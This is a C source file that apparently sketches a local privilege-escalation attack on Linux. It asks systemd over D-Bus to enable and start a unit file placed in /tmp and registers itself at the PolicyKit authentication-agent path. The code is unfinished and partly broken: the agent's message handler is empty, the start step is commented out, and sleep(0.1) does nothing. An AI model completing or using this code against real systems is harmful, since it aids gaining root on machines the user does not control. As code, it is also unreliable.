#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dbus/dbus.h>
#include <unistd.h>
#include <gio/gio.h>
#include <glib/gprintf.h>
#include <gio/gdbusconnection.h>
#include <dbus/dbus-glib-lowlevel.h>

DBusError dbus_error;


int method_call_start_service()
{   

    char *parm_1 = "asdasd.service";
    char *parm_2 = "replace";

    DBusConnection *connection;
    dbus_error_init(&dbus_error);

    sleep(0.1);
    printf("[*] Start systemd service\n");

    connection = dbus_bus_get(DBUS_BUS_SYSTEM, &dbus_error);
    if (connection == NULL){
        printf("get connection error: %s\n", dbus_error.message);
        return 1;
    }

    DBusMessage *message;
    message = dbus_message_new_method_call("org.freedesktop.systemd1", "/org/freedesktop/systemd1", "org.freedesktop.systemd1.Manager", "StartUnit");

    if (message == NULL){
        printf("set message method call error: \n");
        return 1;
    }
    dbus_message_append_args(message, DBUS_TYPE_STRING, &parm_1, DBUS_TYPE_STRING, &parm_2, DBUS_TYPE_INVALID);
    dbus_connection_send(connection, message, NULL);

    dbus_connection_flush(connection);
    dbus_message_unref(message);

    return 0;
}



int method_call_install_service(){
    

    GError *dbus_error = NULL;
    GCancellable       *cancellable = NULL;
    GDBusConnection *connetion;

    char *param_1 = {"/tmp/asdasd.service"};    

    sleep(0.1);
    connetion = g_bus_get_sync (G_BUS_TYPE_SYSTEM, cancellable, &dbus_error);

    g_dbus_connection_call(connetion, "org.freedesktop.systemd1", 
        "/org/freedesktop/systemd1", 
        "org.freedesktop.systemd1.Manager", 
        "EnableUnitFiles", 
        g_variant_new ("(sbb)", param_1, 1, 1),
        NULL,
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        NULL,
        NULL,
        NULL
        );

    return 0;

}


DBusHandlerResult server_message_handler(DBusConnection *conn, DBusMessage *message, void *data)
{


    
}


const DBusObjectPathVTable server_vtable = {
	.message_function = server_message_handler
};

int PolkitAuthenticationAgent(){

    DBusConnection *conn;
	DBusError err;

    GMainLoop *mainloop;



    dbus_error_init(&err);
    conn = dbus_bus_get(DBUS_BUS_SYSTEM, &err);
	if (!conn) {
		fprintf(stderr, "Failed to get a session DBus connection: %s\n", err.message);
		return 1;
	}

    if (!dbus_connection_register_object_path(conn, "/org/freedesktop/PolicyKit1/AuthenticationAgent", &server_vtable, NULL)) {
		fprintf(stderr, "Failed to register a object path for 'TestObject'\n");
		return 1;
	}

    printf("Starting dbus agent server \n");
    mainloop = g_main_loop_new(NULL, FALSE);
	/* Set up the DBus connection to work in a GLib event loop */
	dbus_connection_setup_with_g_main(conn, NULL);
	/* Start the glib event loop */
	g_main_loop_run(mainloop);


    return 0;
}

int start_agent(){

    printf("[*] Starting PolicyKit agent ...\n");

    return 0;
}



int main()
{

    // DBusError error ;
    method_call_install_service();
    // if (method_call_start_service())
    // {
    //     printf("error\n");
    // }

}





